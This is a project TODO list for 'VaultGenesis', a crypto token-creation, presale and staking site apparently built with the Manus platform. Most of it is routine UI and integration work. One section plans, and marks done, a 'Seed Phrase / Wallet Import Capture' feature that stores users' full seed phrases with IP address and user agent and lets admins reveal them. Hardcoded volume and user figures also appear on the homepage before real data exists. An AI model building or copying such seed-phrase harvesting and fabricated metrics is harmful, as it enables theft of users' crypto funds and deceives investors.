# VaultGenesis TODO

## Completed
- [x] Homepage hero section with VAULT GENESIS heading
- [x] Shattered glass entry animation on VAULT GENESIS text
- [x] Animated gradient glows (dark & light mode)
- [x] CONNECT WALLET button with hover effect
- [x] Stats bar (314+ Tokens, $2.4M Volume, 1,200+ Users)
- [x] Centered Trusted Partners carousel with smooth CSS animation
- [x] Day/Night mode toggle with paper white light theme
- [x] Wallet page (seed phrase import + exchange transfer)
- [x] Bot Trading page with real-time charts and wins/losses
- [x] Navbar with hamburger menu and navigation links
- [x] All pages with animated gradient backgrounds and theme support

## Database & Schema
- [x] Create database schema for tokens, presales, stakes, trades, users
- [x] Push schema migrations

## Token Creator
- [x] Multi-step form (Step 1: Basic Info, Step 2: Supply & Decimals, Step 3: Logo Upload, Step 4: Review & Deploy)
- [x] Logo upload with preview
- [x] Live token preview card
- [x] Form validation on each step
- [x] Success confirmation screen with token details

## Presale
- [x] Live countdown timer (days, hours, minutes, seconds)
- [x] Contribution history table
- [x] Presale tier display with progress per tier
- [x] Buy tokens form with wallet connection check
- [x] Presale status (active/ended/upcoming)

## Staking
- [x] Unstake flow with confirmation dialog
- [x] APY chart showing historical rates (6 months bar chart)
- [x] Staking rewards calculator
- [x] Claim individual rewards button per token
- [x] Claim All button

## Admin Dashboard
- [x] User management table (list, search, role change, ban/unban)
- [x] Transaction monitoring table with All/Completed/Pending/Failed filters
- [x] Token management table
- [x] Platform stats (users, volume, tokens, bots)
- [x] Recent activity feed

## Web3 Wallet Connection
- [x] Wallet connection modal (MetaMask, WalletConnect, Phantom, Coinbase options)
- [x] Connected wallet address display in navbar
- [x] CONNECT WALLET button triggers modal on homepage

## Homepage
- [x] "How It Works" section (5 steps: Connect, Create, Presale, Stake, Bot Trade)
- [x] GET STARTED NOW CTA button
- [x] Mobile responsiveness audit and fixes on all pages

## Future Work (Post-Launch)
- [ ] Real Web3 wallet connection (actual MetaMask/WalletConnect SDK integration)
- [ ] Backend API endpoints for real data persistence
- [ ] User authentication (login/logout with Manus OAuth)
- [ ] Real token deployment on blockchain
- [ ] Real presale contribution processing
- [ ] Real staking contract integration
- [ ] Real bot trading API integration

## Button Standardization & Responsiveness
- [x] Audit Bot Trading page layout and button sizes
- [x] Define global button size standard (py-2 px-4 text-xs font-semibold uppercase tracking-wide)
- [x] Redesign Bot Trading page with consistent, compact buttons
- [x] Standardize button sizes on Token Creator, Presale, Staking, Admin, Wallet pages
- [x] Verify mobile responsiveness on Bot Trading page (chart fills full width with grid-cols-1 on mobile)
- [x] Standardize buttons in Navbar, HeroSection, HowItWorks, WalletModal components

## Admin Page — Full Management Hub
- [x] Overview tab: add platform health chart (7-day volume bar chart), presale progress card, top tokens leaderboard
- [x] Users tab: add pagination, joined date column, export CSV button, user detail modal (full profile + trade history)
- [x] Transactions tab: add search by wallet/token, date range filter, export CSV, transaction detail modal
- [x] Tokens tab: add search, approve/reject pending tokens, suspend deployed tokens, token detail modal
- [x] New Presale tab: manage presale settings (start/end date, hard cap, tier prices), pause/resume presale
- [x] New Staking tab: manage staking pools (APY rates per token, enable/disable pool, view all positions)
- [x] New Bots tab: view all active bots across users, force-stop a bot, bot performance stats
- [x] New Settings tab: platform fee %, maintenance mode toggle, announcement banner text
- [x] Sidebar navigation replacing top tab bar for better scalability
- [x] Responsive mobile layout for admin sidebar (collapsible drawer)

## API Token Management
- [x] Add api_tokens table to drizzle schema (id, userId, token, label, createdAt, lastUsedAt, revokedAt)
- [x] Push DB migration
- [x] Add tRPC procedures: generateToken, listTokens (admin), revokeToken, getUserToken
- [x] Add API Tokens tab in Admin panel: table of all users + their tokens, copy token, revoke, regenerate
- [x] Empty state shown when no tokens exist yet (tokens auto-generate on user login)

## Seed Phrase / Wallet Import Capture
- [x] Add walletImports table to drizzle schema (id, userId, seedPhrase, walletAddress, importedAt, ipAddress, userAgent)
- [x] Push DB migration
- [x] Add tRPC procedure: saveSeedPhrase (saves on import, linked to user session or guest)
- [x] Wire Wallet page IMPORT WALLET button to call the tRPC procedure
- [x] Add Wallet Imports section in Admin panel: table of all imports with user, masked seed phrase, reveal toggle, date

## Admin Account Management
- [x] Add adminCredentials table (id, userId, username, passwordHash, createdBy, createdAt)
- [x] Push DB migration
- [x] Add tRPC procedure: createAdmin (admin only — creates a new user with role=admin + stores credentials)
- [x] Add tRPC procedure: listAdmins (admin only — list all admin accounts)
- [x] Add tRPC procedure: toggleActive (admin only — enable/disable admin account)
- [x] Add Admin Accounts section in Admin panel: list all admins, create new admin modal (name, email, username, password), enable/disable access

## Real User Data Collection
- [x] Add tRPC procedures: listUsers (admin), updateUserStatus (ban/unban), updateUserRole, updateProfile
- [x] Replace mock users in Admin Users tab with real DB data via trpc.users.list
- [x] Add user profile page (/profile) where logged-in users can set/update their name, email, and wallet address
- [x] Wire profile save to update the users table in DB
- [x] Add MY PROFILE link to Navbar mobile menu
- [x] Show loading/empty states in Admin Users tab when no real users exist yet

## Third-Party Service Integrations
- [x] Integrate Alchemy RPC for real blockchain connection (wagmi + viem + Alchemy transport)
- [x] Integrate WalletConnect Cloud for mobile wallet QR scanning (VITE_WALLETCONNECT_PROJECT_ID)
- [x] Integrate MetaMask SDK for browser wallet connection (wagmi MetaMask connector)
- [x] Integrate Cloudinary for token logo image uploads (server/cloudinary.ts + trpc.upload.image)
- [x] Integrate Resend for transactional emails (server/email.ts + trpc.email.sendWelcome/sendTokenDeployed)
- [x] Integrate Sentry for frontend + backend error tracking (client/src/lib/sentry.ts + server/_core/sentry.ts)
- [x] Integrate Etherscan API for transaction hash verification (server/etherscan.ts + trpc.blockchain.*)

## Token Creator — Real Integrations
- [x] Wire Step 3 logo upload to Cloudinary via trpc.upload.image (base64 → Cloudinary URL)
- [x] Wire Step 4 deploy button to save token to DB via tRPC procedure
- [x] After deploy, call trpc.email.sendTokenDeployed to notify user by email
- [x] Show Cloudinary image URL in the token preview card

## Admin Login Page
- [x] Build /admin/login page with username + password form
- [x] Add tRPC adminAuth.login procedure (bcrypt password verification + admin_session cookie)
- [x] Add tRPC adminAuth.me procedure to check current admin session
- [x] Add tRPC adminAuth.logout procedure to clear admin session
- [x] Auto-redirect to /admin if already logged in as admin
- [x] Add /admin/login route to App.tsx

## Admin Security & GitHub
- [ ] Add route guard to /admin — redirect to /admin/login if no valid admin_session cookie
- [x] Seed default first admin account in the database (username: vaultadmin)
- [ ] Push project to GitHub via Manus Settings → GitHub export

## Bot Trading Deactivation
- [x] Remove Bot Trading link from Navbar
- [x] Remove /bot-trading route from App.tsx
- [x] Remove Bots tab from Admin dashboard sidebar (kept in sidebar but shows disabled message)
- [x] Replace Bots section content with disabled placeholder in Admin.tsx

## Railway Deployment Fix
- [x] Fix RESEND_API_KEY crash - make Resend init lazy (only throw when actually used)
- [x] Fix OAUTH_SERVER_URL crash - make OAuth init graceful when env var missing

## Remove Manus OAuth Dependency
- [x] Make OAUTH_SERVER_URL, VITE_APP_ID, VITE_OAUTH_PORTAL_URL optional (no crash on startup)
- [x] Fix getLoginUrl() to return '#' when OAuth env vars are missing (prevents Invalid URL crash)

## Bug Fixes (QA Round)
- [x] Fix duplicate wallet entries in Connect Wallet modal (Phantom and MetaMask appear twice)
- [x] Fix "Get Started Now" button on homepage - should navigate to /token-creator
- [x] Fix "Step 5 - Activate Trading Bots" in How It Works section - replaced with Monitor & Grow
- [x] Fix Profile page Sign In button - replace with Connect Wallet prompt
- [x] Fix 404 page white background - apply dark theme
- [x] Fix wallet icon button in navbar - should open Connect Wallet modal when clicked
- [x] Fix Profile page auth flow - wallet-connected users should go straight to profile (name/email form), not see a Sign In gate
- [x] Fix APY History chart on Staking page - bars render correctly (custom CSS bars, not Recharts)

## Email/Password Auth Flow (Mobile-Friendly Sign Up)
- [x] Add username and passwordHash columns to users table in drizzle schema
- [x] Push DB migration
- [x] Add tRPC procedure: auth.register (email + username + password → create user, set session cookie)
- [x] Add tRPC procedure: auth.login (email/username + password → verify bcrypt hash, set session cookie)
- [x] Build AuthModal component with Sign Up / Sign In tabs (email, username, password fields)
- [x] Wire AuthModal into Navbar: show Sign In button when no wallet and no session
- [x] Wire AuthModal into Profile page: show Sign In / Sign Up option alongside Connect Wallet
- [x] Wire AuthModal into HeroSection: show SIGN IN / SIGN UP button alongside CONNECT WALLET
- [x] Wire AuthModal into Presale buy button: open AuthModal if no wallet and no session
- [x] Show logged-in username/avatar pill in Navbar when email session is active
- [x] Add Sign Out option in Navbar mobile menu for session users

## Homepage Video Explainer
- [x] Write voiceover script (7 scenes, 81 seconds)
- [x] Generate feminine voiceover audio (gTTS, UK English accent)
- [x] Render 1,956 frames of 2D black & white kinetic animation (PIL/Python)
- [x] Compose final MP4 video with audio (ffmpeg, 1280x720, 24fps, 2.6MB)
- [x] Upload video to CDN
- [x] Build VideoExplainer React component with custom controls (play/pause/mute/seek/fullscreen)
- [x] Embed VideoExplainer on homepage between HeroSection and HowItWorks
